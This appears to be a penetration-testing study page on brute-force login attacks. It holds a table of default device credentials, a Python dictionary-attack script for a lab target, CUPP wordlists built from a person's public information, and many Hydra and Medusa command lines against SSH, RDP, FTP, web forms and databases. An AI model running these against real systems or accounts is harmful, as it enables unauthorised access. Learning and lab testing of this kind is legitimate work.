---
layout: default
title: Brute Force Attacks
permalink: /Web/brute_force/
---

## Default Passwords
Some examples of default passwords:
{% raw %}
| Device/Manufacturer    | Default Username | Default Password | Device Type                     |
|------------------------|------------------|------------------|---------------------------------|
| Linksys Router         | admin            | admin            | Wireless Router                 |
| D-Link Router          | admin            | admin            | Wireless Router                 |
| Netgear Router         | admin            | password         | Wireless Router                 |
| TP-Link Router         | admin            | admin            | Wireless Router                 |
| Cisco Router           | cisco            | cisco            | Network Router                  |
| Asus Router            | admin            | admin            | Wireless Router                 |
| Belkin Router          | admin            | password         | Wireless Router                 |
| Zyxel Router           | admin            | 1234             | Wireless Router                 |
| Samsung SmartCam       | admin            | 4321             | IP Camera                       |
| Hikvision DVR          | admin            | 12345            | Digital Video Recorder (DVR)   |
| Axis IP Camera         | root             | pass             | IP Camera                       |
| Ubiquiti UniFi AP      | ubnt             | ubnt             | Wireless Access Point           |
| Canon Printer          | admin            | admin            | Network Printer                 |
| Honeywell Thermostat   | admin            | 1234             | Smart Thermostat                |
| Panasonic DVR          | admin            | 12345            | Digital Video Recorder (DVR)   |
{% endraw %}
[CIRT.net](https://www.cirt.net/passwords) is a database for default credentials. <br>

SecLists maintains a list of common usernames at [top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt).

## Utilizing Wordlists

- Publicly Available Lists: Repositories like [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) offer various wordlists catering to various attack scenarios.
- Custom-Built Lists: We can craft our wordlists by leveraging information gleaned during reconnaissance.

### Dictionary Attack

Example python script for dictionary attack:
```
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```
We can costumize wordlists based on the password policy:
```
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```
These commands:
- Filter for passwords containing at least 8 characters.
- Enforces at least one uppercase letter.
- Enforces at least one lowercase letter.
- Enforces that passwords containing at least one numerical digit.

*Note: Many users reuse passwords across multiple online accounts, so breached passwords can be useful.*

### Custom Wordlists
#### Username Anarchy
```
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```
```
./username-anarchy Jane Smith > jane_smith_usernames.txt
```
#### CUPP
After we employed Username Anarchy to generate a list of potential usernames, we can use CUPP to complement this with a targeted password list.
```
sudo apt install cupp -y
```
We can one gather this valuable intelligence for a target:
- Social Media
- Company Websites
- Public Records
- News Articles and Blogs

Open interactive mode:
```
cupp -i
```
After we generated a list, we can use grep to filter that password list to match a certain policy:
```
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```
## Hydra
It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.
Hydra's basic syntax:
```
hydra [login_options] [password_options] [attack_options] [service_options]
```
Few examples:
- FTP: `hydra -l admin -P /path/to/password_list.txt ftp://$ip`, `hydra -L usernames.txt -P passwords.txt -s $port -V ftp.example.com ftp`
- SSH: `hydra -l root -P /path/to/password_list.txt ssh://$ip`, `hydra -l root -p toor -M targets.txt ssh`
- HTTP-GET (Basic HTTP Authentication): `hydra -L usernames.txt -P passwords.txt www.example.com http-get`, `hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt $ip http-get / -s $port`
- HTTP-POST: `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`,`hydra -l admin -P /path/to/password_list.txt $ip http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`
- SMTP: `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`
- POP3: `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`
- IMAP: `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`
- MySQL: `hydra -l root -P /path/to/password_list.txt mysql://$ip`
- RDP: `hydra -l admin -P /path/to/password_list.txt rdp://$ip`, `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 $ip rdp`

### Constructing the params String (HTTP-POST)
This string encapsulates the data that will be sent to the server with each login attempt, mimicking a legitimate form submission.
- Form Parameters: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (^USER^ and ^PASS^) within these parameters with values from your wordlists.
- Additional Fields: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the params string.
- Success Condition: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like S=302 for a redirect) or the presence or absence of specific text in the server's response (e.g., F=Invalid credentials or S=Welcome).

## Medusa
```
medusa [target_options] [credential_options] -M module [module_options]
```
Few examples:
- SSH: `medusa -h $ip -n $port -U usernames.txt -P passwords.txt -M ssh -t 3`, `medusa -h $ip -u user -P passwords.txt -M ssh`
- HTTP-GET (Basic HTTP Authentication): `medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET`
- `medusa -h $ip -U usernames.txt -e ns -M service_name`: Perform checks for empty passwords (-e n) and passwords matching the username (-e s).
